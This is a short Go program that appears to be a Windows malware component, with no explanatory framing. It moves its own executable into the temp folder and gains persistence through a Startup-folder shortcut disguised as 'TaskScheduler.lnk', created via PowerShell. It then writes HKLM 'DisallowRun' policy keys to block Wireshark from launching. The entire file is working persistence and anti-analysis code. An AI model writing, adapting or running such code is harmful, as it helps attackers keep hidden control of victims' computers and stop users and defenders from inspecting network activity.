package main

import (
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "time"
)

func main() {
    time.Sleep(2 * time.Second)    

    tmpDir := os.TempDir()

    exePath, err := os.Executable()
    if err != nil {
        panic(err.Error())
    }

    newExePath := filepath.Join(tmpDir, filepath.Base(exePath))
    err = os.Rename(exePath, newExePath)
    if err != nil {
        panic(err.Error())
    }

    userConfigDir, err := os.UserConfigDir()
    if err != nil {
       panic(err.Error())
    }

    startupDir := filepath.Join(userConfigDir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shortcutPath := filepath.Join(startupDir, "TaskScheduler.lnk")
    cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`$s=(New-Object -COM WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.WorkingDirectory='%s';$s.Save()`, shortcutPath, newExePath, filepath.Dir(newExePath)))
    err = cmd.Run()
    if err != nil {
        panic(err.Error())
    }

    appName := "Wireshark"
    cmd = exec.Command("cmd", "/C", fmt.Sprintf(`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t REG_DWORD /d "2" /f`))
    err = cmd.Run()
    if err != nil {
       panic(err.Error())
    }
    cmd = exec.Command("cmd", "/C", fmt.Sprintf(`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "%s" /f`, appName))
    err = cmd.Run()
    if err != nil {
       panic(err.Error())
    }
}
